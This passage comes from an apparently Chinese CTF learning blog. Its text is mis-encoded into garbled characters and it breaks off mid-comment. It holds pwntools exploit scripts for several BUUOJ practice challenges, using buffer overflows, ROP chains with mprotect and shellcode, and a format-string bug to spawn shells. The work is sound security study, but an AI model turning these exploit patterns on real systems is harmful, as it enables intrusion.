arch=&quot;i386&quot;, log_level=&quot;debug&quot;)</span></span><br><span class="line">q = process(<span class="string">&quot;../get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;../get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"><span class="comment">#ä¸ºè°ƒç”¨ä¸¤ä¸ªè‡ªå¸¦çš„å‡½æ•°åšå‡†å¤‡ï¼Œä¸€ä¸ªæ˜¯mprotectï¼Œç”¨äºæ”¹å˜å†…å­˜æƒé™ï¼›ä¸€ä¸ªæ˜¯readï¼Œç”¨äºè¯»å–å¹¶å†™å…¥shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å†…å­˜æƒé™æ”¹å˜çš„èµ·å§‹åœ°å€ï¼Œä¹Ÿæ˜¯shellcodeå†™å…¥çš„èµ·å§‹åœ°å€</span></span><br><span class="line">start_addr = <span class="number">0x80ea000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œä¸‰ä¸ªå¼¹æ ˆæ“ä½œçš„æ±‡ç¼–ä»£ç èµ·å§‹ä½ç½®</span></span><br><span class="line">pop_3_ret = <span class="number">0x806fc30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ­¤ropé“¾è¢«ç”¨äºå°çŸ¥è¯†è®²è§£ï¼Œè¯¦è§æ–‡ç« pwnå°çŸ¥è¯†ã€‚</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect_addr)</span><br><span class="line">payload += p32(pop_3_ret)<span class="comment"># mprotectæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œ32ä½æ ˆå‡½æ•°ä¼ å‚</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)     <span class="comment"># 0x7 == å¯è¯»å¯å†™å¯æ‰§è¡Œ</span></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">payload += p32(start_addr)<span class="comment">#æ‰§è¡Œå®Œreadä¹‹åè¿”å›çš„åœ°å€</span></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)<span class="comment">#ä¸€æ®µshellcode</span></span><br><span class="line"></span><br><span class="line">q.sendline(payload)</span><br><span class="line"><span class="comment">#sleep(0.1)</span></span><br><span class="line">q.sendline(shellcode)<span class="comment">#readè¿˜ä¼šè¦æ±‚è¾“å…¥ï¼Œè¿™æ—¶è¾“å…¥shellcode</span></span><br><span class="line">q.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h3><p>1.å¦‚ä½•æ‰¾åˆ°å†™<code>&#39;/bin/sh&#39;</code>çš„åœ°å€ï¼Ÿ</p><p>  1.æ‰§è¡Œé¢˜ç›®çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚<code>./vuln</code></p><p>  2.å¯»æ‰¾è¯¥æ–‡ä»¶çš„å½“å‰è¿›ç¨‹çš„PIDï¼Œ<code>pgrep -f vuln</code>ï¼Œå‡è®¾è¿”å›å€¼12345</p><p>  3.æŸ¥æ‰¾å¯å†™åœ°å€ï¼Œ<code>pmap 12345 | grep rw</code>ï¼Œæå®šã€‚</p><ol start="2"><li></li></ol><h3 id="ğŸš€-mprotectå‡½æ•°ç®€ä»‹"><a href="#ğŸš€-mprotectå‡½æ•°ç®€ä»‹" class="headerlink" title="ğŸš€ mprotectå‡½æ•°ç®€ä»‹"></a>ğŸš€ mprotectå‡½æ•°ç®€ä»‹</h3><p><code>mprotect</code>æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä¸»è¦ç”¨äºæ”¹å˜å†…å­˜åŒºåŸŸçš„ä¿æŠ¤å±æ€§ã€‚åœ¨Linuxç¯å¢ƒä¸‹ï¼Œå®ƒçš„åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><h3 id="ğŸ¯-ä¸»è¦å‚æ•°"><a href="#ğŸ¯-ä¸»è¦å‚æ•°" class="headerlink" title="ğŸ¯ ä¸»è¦å‚æ•°"></a>ğŸ¯ ä¸»è¦å‚æ•°</h3><ul><li><p><code>addr</code>: è¦æ›´æ”¹çš„å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ã€‚é€šå¸¸ï¼Œè¿™ä¸ªåœ°å€å¿…é¡»æ˜¯ç³»ç»Ÿé¡µå¤§å°çš„å€æ•°ï¼ˆä¸€èˆ¬æ˜¯4KBï¼‰ã€‚</p></li><li><p><code>len</code>: éœ€è¦æ›´æ”¹çš„å†…å­˜é•¿åº¦ã€‚</p></li><li><p><code>prot</code>: æŒ‡å®šæ–°çš„ä¿æŠ¤å±æ€§ã€‚å®ƒæ˜¯ä»¥ä¸‹æ ‡å¿—çš„ç»„åˆï¼š</p><ul><li><p><code>PROT_NONE</code>: ä¸å¯è®¿é—®ã€‚</p></li><li><p><code>PROT_READ</code>: å¯è¯»ã€‚</p></li><li><p><code>PROT_WRITE</code>: å¯å†™ã€‚</p></li><li><p><code>PROT_EXEC</code>: å¯æ‰§è¡Œã€‚</p><p>ä¸Šæ–‡æåˆ°çš„<code>0x7</code>å®é™…ä¸Šæ˜¯ä¸€ä¸ªç»„åˆå€¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶åˆ†è§£ä¸ºå¤šä¸ªæƒé™æ ‡å¿—æ¥çœ‹ã€‚ğŸ”</p><p><code>0x7</code>åœ¨äºŒè¿›åˆ¶ä¸­è¡¨ç¤ºä¸º<code>111</code>ï¼Œå…¶ä¸­ï¼š</p><ul><li>æœ€ä½ä½ï¼ˆç¬¬0ä½ï¼‰ä»£è¡¨<code>PROT_EXEC</code>ï¼Œè¡¨ç¤ºå¯æ‰§è¡Œæƒé™ã€‚</li><li>ä¸­é—´ä½ï¼ˆç¬¬1ä½ï¼‰ä»£è¡¨<code>PROT_WRITE</code>ï¼Œè¡¨ç¤ºå¯å†™æƒé™ã€‚</li><li>æœ€é«˜ä½ï¼ˆç¬¬2ä½ï¼‰ä»£è¡¨<code>PROT_READ</code>ï¼Œè¡¨ç¤ºå¯è¯»æƒé™ã€‚</li></ul><p>æ‰€ä»¥ï¼Œ<code>prot</code>ä¸º<code>0x7</code>æ—¶ï¼Œæ„å‘³ç€è¿™æ®µå†…å­˜åŒºåŸŸåŒæ—¶å…·æœ‰<strong>è¯»ã€å†™ã€æ‰§è¡Œ</strong>çš„æƒé™ã€‚ğŸ˜„ğŸŒˆ</p></li></ul></li></ul><h3 id="ğŸ‰-è¿”å›å€¼"><a href="#ğŸ‰-è¿”å›å€¼" class="headerlink" title="ğŸ‰ è¿”å›å€¼"></a>ğŸ‰ è¿”å›å€¼</h3><p>æˆåŠŸæ—¶ï¼Œè¿”å›0ï¼›å¤±è´¥æ—¶ï¼Œè¿”å›-1ï¼Œå¹¶è®¾ç½®<code>errno</code>ã€‚</p><ol start="3"><li><p>å–„ç”¨GDBè°ƒè¯•ï¼Œdebugæ—¥å¿—ç­‰ã€‚</p></li><li><h3 id="ğŸ§-ä»£ç è§£æ"><a href="#ğŸ§-ä»£ç è§£æ" class="headerlink" title="ğŸ§ ä»£ç è§£æ"></a>ğŸ§ ä»£ç è§£æ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br></pre></td></tr></table></figure><ol><li><strong>shellcraft.sh()</strong>: è¿™æ˜¯<code>pwntools</code>çš„<code>shellcraft</code>æ¨¡å—æä¾›çš„å‡½æ•°ï¼Œå®ƒä¼šç”Ÿæˆä¸€ä¸ªåŸºæœ¬çš„shellcodeï¼Œé€šå¸¸ç”¨äºå¼¹å‡ºä¸€ä¸ªshellã€‚è¿™ä¸ªshellcodeé»˜è®¤æ˜¯ç”¨<strong>æ±‡ç¼–è¯­è¨€</strong>æè¿°çš„ã€‚</li><li><strong>asm()</strong>: è¿™æ˜¯<code>pwntools</code>çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†ç»™å®šçš„æ±‡ç¼–ä»£ç ç¼–è¯‘æˆäºŒè¿›åˆ¶æ ¼å¼çš„shellcodeã€‚åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå®ƒå°†<code>shellcraft.sh()</code>ç”Ÿæˆçš„æ±‡ç¼–shellcodeè½¬æ¢æˆäº†äºŒè¿›åˆ¶æ ¼å¼ã€‚</li><li><strong>arch&#x3D;â€™i386â€™, os&#x3D;â€™linuxâ€™</strong>: è¿™äº›æ˜¯<code>asm</code>å‡½æ•°çš„å‚æ•°ï¼Œç”¨äºæŒ‡å®šç›®æ ‡æ¶æ„å’Œæ“ä½œç³»ç»Ÿã€‚åœ¨æ­¤ä¾‹ä¸­ï¼Œç›®æ ‡æ¶æ„æ˜¯<code>i386</code>ï¼ˆ32ä½x86æ¶æ„ï¼‰ï¼Œæ“ä½œç³»ç»Ÿæ˜¯Linuxã€‚</li></ol><h3 id="ğŸ‰-ç»“æœ"><a href="#ğŸ‰-ç»“æœ" class="headerlink" title="ğŸ‰ ç»“æœ"></a>ğŸ‰ ç»“æœ</h3><p>å¾—åˆ°ä¸€ä¸ªå¯ä»¥åœ¨32ä½Linuxç³»ç»Ÿä¸Šè¿è¡Œçš„ã€ç”¨äºå¼¹å‡ºshellçš„äºŒè¿›åˆ¶shellcodeã€‚</p></li></ol><h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><p><em>9.1</em></p><p><strong>æœ‰ç‚¹éš¾ï¼Œå¾ˆå¤šæ²¡ææ‡‚ï¼Œææ‡‚äº†å†æ¥æ›´æ–°</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26593)</span></span><br><span class="line">io = process(<span class="string">&#x27;../ciscn_s_3&#x27;</span>)</span><br><span class="line">vuln=<span class="number">0x0004004ED</span></span><br><span class="line">execv=<span class="number">0x04004E2</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15=<span class="number">0x40059A</span></span><br><span class="line">mov_rdxr13_call=<span class="number">0x0400580</span> </span><br><span class="line">sys=<span class="number">0x00400517</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vuln)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recv(<span class="number">32</span>)</span><br><span class="line">sh=u64(io.recv(<span class="number">8</span>))-<span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sh))</span><br><span class="line"></span><br><span class="line">pl2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+ <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(sh+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">pl2+=p64(mov_rdxr13_call)+p64(execv)</span><br><span class="line">pl2+=p64(pop_rdi)+p64(sh)</span><br><span class="line">pl2+=p64(sys)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p><em>0831</em></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26963</span>)</span><br><span class="line">door = <span class="number">0x4006E6</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>,<span class="string">b&#x27;200&#x27;</span>)</span><br><span class="line">p = (<span class="number">16</span> + <span class="number">8</span>) * <span class="string">b&#x27;a&#x27;</span> + p64(door)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>,p)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><em>0830</em></p><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p><strong>ä»Šå¤©çš„é¢˜ç›®å’‹è¿™ä¹ˆè‰ç‡</strong></p><h4 id="1-exploit"><a href="#1-exploit" class="headerlink" title="1.exploit"></a>1.exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26983</span>)</span><br><span class="line"></span><br><span class="line">p = p32(<span class="number">1</span>) * <span class="number">13</span> + p32(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#p = b&#x27;a&#x27; * 4 *13 + p32(17)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;What&#x27;s your name?&quot;</span>,p)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-åæ€"><a href="#2-åæ€" class="headerlink" title="2.åæ€"></a>2.åæ€</h4><p>1.payloadæœ‰ä¸¤ç§è¡¨ç¤ºæ–¹æ³•ï¼Œç¬¬ä¸€ç§çº¯ç”¨æ•°å­—1å¡«æ•°ç»„ï¼Œç¬¬äºŒç§æ³¨æ„ä¸€ä¸ªæ•´æ•°å å››ä½ï¼Œè¦ä¹˜4</p><p>2.checksecå¼€å¯äº†å‡ ä¹æ‰€æœ‰ä¿æŠ¤ï¼Œä½†æ˜¯é€šè¿‡IDAçœ‹å‡ºå¯ä»¥çº¯çº¯é€šè¿‡è¦æ±‚è¾“å…¥æ¥æå®šï¼Œæ›´ç®€å•äº†ã€‚</p><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p><strong>éš¾åº¦éª¤é™ï¼Œå—ä¸äº†</strong></p><h4 id="1-exploit-1"><a href="#1-exploit-1" class="headerlink" title="1.exploit"></a>1.exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29560</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x804A024</span></span><br><span class="line">sys = <span class="number">0x804849E</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">136</span> + <span class="number">4</span>) + p32(sys) + p32(binsh) </span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Input:&quot;</span>,p)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="2-åæ€-1"><a href="#2-åæ€-1" class="headerlink" title="2.åæ€"></a>2.åæ€</h4><p>1.æ³¨æ„32ä½ä¸64ä½çš„åŒºåˆ«</p><p>2.sysçš„åœ°å€å®é™…ä¸ºâ€œcall systemâ€</p><p>3.IDAæ³¨æ„shift+f12æŸ¥çœ‹å­—ç¬¦ä¸²çš„æŠ€å·§</p><h2 id="pwn1-sctf-2016-1"><a href="#pwn1-sctf-2016-1" class="headerlink" title="pwn1_sctf_2016  1"></a>pwn1_sctf_2016  1</h2><p>0826</p><h4 id="1-åˆ†æ"><a href="#1-åˆ†æ" class="headerlink" title="1.åˆ†æ"></a>1.åˆ†æ</h4><p>IDAæ‰“å¼€ï¼Œvulnå‡½æ•°ï¼Œä»£ç æ¯”è¾ƒé•¿ï¼Œå°±ä¸ç›´æ¥å±•ç¤ºäº†ã€‚</p><p>æ•æ‰åˆ°å…³é”®ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">;æ­¤å¤„å®šä¹‰ä¸€ä¸ª<span class="number">32</span>ä½çš„å­—ç¬¦å‹sæ•°ç»„ï¼ŒåŒæ—¶å¯ä»¥æ³¨æ„åˆ°å®ƒè·ç¦»ebpæœ‰<span class="number">3</span>Chçš„è·ç¦»ï¼Œä¸º<span class="number">60</span>ä½ã€‚</span><br><span class="line"></span><br><span class="line"><span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">;è¿™æ˜¯ä¸€ä¸ªfgetsï¼Œç›¸å¯¹äºgetsè¦å®‰å…¨ï¼Œé™å®šäº†è¾“å…¥çš„é•¿åº¦<span class="number">32</span>ä½</span><br><span class="line"></span><br><span class="line">std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">;ä¸€ä¸ªâ€œyouâ€å­—ç¬¦ä¸²å¼•äººæ³¨æ„</span><br><span class="line"></span><br><span class="line">std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">;ä¸€ä¸ªâ€œIâ€å­—ç¬¦ä¸²å¼•äººæ³¨æ„</span><br><span class="line"></span><br><span class="line"><span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">;å¼•äººçŒœæµ‹æœ‰å‘ç”Ÿreplaceã€‚ç‚¹è¿›replaceï¼Œä¹±ä¸ƒå…«ç³Ÿï¼Œæ‡’å¾—çœ‹ã€‚</span><br></pre></td></tr></table></figure><p>ç”±äºä¼ªä»£ç ä¼šå‡ºç°å¾ˆå¤šä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦é€‰æ‹©æ€§å¿½ç•¥ã€‚</p><p>å¦å¤–ï¼Œçœ‹ä»£ç å±äºé™æ€ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å»è¿›è¡ŒåŠ¨æ€çš„è°ƒè¯•ï¼Œæ¥å¿«é€Ÿç†è§£é¢˜ç›®åŠŸèƒ½ã€‚</p><p>åœ¨ubuntuçš„terminalä¸­ï¼Œå®‰è£…C++æ–‡ä»¶ä¾èµ–ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install lib32stdc++6</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ–‡ä»¶ï¼Œè¾“å…¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">youyouyouIII111</span><br></pre></td></tr></table></figure><p>è¿”å›</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">So, youyouyouyouyouyou111</span><br></pre></td></tr></table></figure><p>å‘ç°â€œIâ€å…¨éƒ½æ›¿æ¢æˆäº†â€œyouâ€ã€‚</p><p>è¯´æ˜æˆ‘åªè¦è¾“ä¸€å­—ç¬¦â€œIâ€å°±å¯ä»¥è·å¾—ä¸‰å­—ç¬¦çš„â€œyouâ€ï¼Œ</p><p>å› æ­¤éœ€è¦å°è¯•çˆ†ç ´çš„è¯ï¼Œè·ç¦»ebp60ä½ï¼Œåªéœ€è¦20ä¸ªâ€œIâ€å°±å¯ä»¥è§£å†³ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬ebpæ˜¯4ä½ï¼Œéœ€è¦å†æ¥ä¸€ä¸ªâ€œIâ€å’Œä¸€ä¸ªå…¶ä»–å­—ç¬¦<strong>æˆ–</strong>å››ä¸ªå…¶ä»–å­—ç¬¦ã€‚</p><p>å¦å¤–ï¼Œå‘ç°ä¸€ä¸ªåé—¨å‡½æ•°æ˜¯get_flagï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048F13                 mov     dword ptr [esp], offset command ; &quot;cat flag.txt&quot;</span><br></pre></td></tr></table></figure><p>åœ°å€ä¸ºï¼š0x8048F13</p><p>ç†è®ºå¯è¡Œï¼Œå®æ“å¼€å§‹ã€‚</p><h4 id="2-å®æ“"><a href="#2-å®æ“" class="headerlink" title="2.å®æ“"></a>2.å®æ“</h4><p>Ubuntuä¸­æ‰“å¼€codeï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26361</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">21</span>  + <span class="string">b&#x27;a&#x27;</span>  + p32(<span class="number">0x8048F13</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>overã€‚</p><h2 id="jarvisoj-level0-1"><a href="#jarvisoj-level0-1" class="headerlink" title="jarvisoj_level0  1"></a>jarvisoj_level0  1</h2><p>0827</p><p>å‰é¢åšäº†è¿™ä¹ˆå¤šï¼Œè¿™é¢˜æœ‰ç‚¹è¿‡äºè€å¥—äº†ã€‚</p><p>1.åˆ†æ</p><p>IDA:</p><p>æ³¨æ„vulnerable_functionå’Œcallsystemè¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p><p>å…¶ä¸­vulnerable_functionå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆç»å…¸ï¼Œè€ƒè™‘ 80h buf + 8h rbp</p><p>å¦å¤–callsystemä¸­è½»æ˜“è·å¾—å”¤èµ·æ§åˆ¶å°åœ°å€ã€‚</p><p>2.ä»£ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25124</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * (<span class="number">128</span>+<span class="number">8</span>)   + p64(<span class="number">0x40059A</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-1"><a href="#ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-1" class="headerlink" title="[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5  1"></a>[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5  1</h2><p>0827</p><h4 id="1-å°è¯•"><a href="#1-å°è¯•" class="headerlink" title="1.å°è¯•"></a>1.å°è¯•</h4><p>ä½¿ç”¨checksecï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°æœ‰<strong>Canary</strong>ï¼Œæº¢å‡ºæœ‰ä¿æŠ¤ã€‚</p><p><strong>NX</strong>å¼€å¯ï¼Œè¯´æ˜æ ˆä¸­æ•°æ®æ²¡æœ‰æ‰§è¡Œæƒé™ã€‚</p><p>è¿è¡Œç¨‹åºï¼Œåˆæ­¥å°è¯•ã€‚</p><h4 id="2-åˆ†æ"><a href="#2-åˆ†æ" class="headerlink" title="2.åˆ†æ"></a>2.åˆ†æ</h4><p>ç”¨IDA32ä½ï¼Œæ‰“å¼€ï¼Œå…³é”®éƒ¨åˆ†å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line"><span class="comment">//bufè·ç¦»ebp7*16=112ï¼Œè€Œbufå 100ä½</span></span><br><span class="line"><span class="comment">//nptrè·ç¦»ebp 80hï¼Œå³åœ¨bufä¸‹é¢å 12ä½ã€‚</span></span><br><span class="line"></span><br><span class="line">v1 = time(<span class="number">0</span>);</span><br><span class="line">srand(v1);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// ä½¿ç”¨ç§å­ä»¥åï¼Œäº§ç”Ÿéšæœºæ•°</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(fd, &amp;unk_804C044, <span class="number">4u</span>);</span><br><span class="line"><span class="comment">//æŠŠéšæœºæ•°å†™å…¥unk_804C044æ‰€æŒ‡å‘çš„åœ°å€ï¼Œå å››ä¸ªå­—èŠ‚ï¼Œuè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ã€‚</span></span><br><span class="line"><span class="comment">//unk_804C044å­˜åœ¨äºbssæ®µï¼Œæ— æ³•ç›´æ¥è·å–ã€‚</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line"><span class="comment">// bufåˆ°æ ˆåº•çš„é•¿åº¦æœ‰0x70hï¼Œä½†æ˜¯æˆ‘ä»¬åªèƒ½è¾“å…¥ 0x63hï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ— æ³•åœ¨è¿™é‡Œæº¢å‡º</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"><span class="comment">// printfå‡½æ•°è¾“å‡ºäº†åˆšæ‰è¾“å…¥çš„ä¸œè¥¿ï¼Œè€Œæ²¡æœ‰PIEï¼Œå¯ä»¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ”»å‡»ã€‚</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line"><span class="comment">// åŒç†ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿæ— æ³•åœ¨è¿™é‡Œæº¢å‡º</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/*æ­¤å¤„åˆ¤æ–­æ¡ä»¶æ˜¯åˆ©ç”¨çš„å…³é”®ç‚¹ï¼Œä¸Šè¿°æœ‰ä¸¤æ¬¡readï¼Œæœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ¡ˆï¼š</span></span><br><span class="line"><span class="comment">1.ç¬¬ä¸€æ¬¡readå°†unk_804C044çš„å€¼åˆ©ç”¨%næ”¹æˆä¸€ä¸ªå·²çŸ¥æ•°ï¼Œç¬¬äºŒæ¬¡readå†å°†å·²çŸ¥æ•°ä¼ ç»™nptrï¼Œæ»¡è¶³åˆ¤æ–­æ¡ä»¶ï¼Œæ‰§è¡Œputs(&quot;ok!!&quot;);  å’Œ  system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span 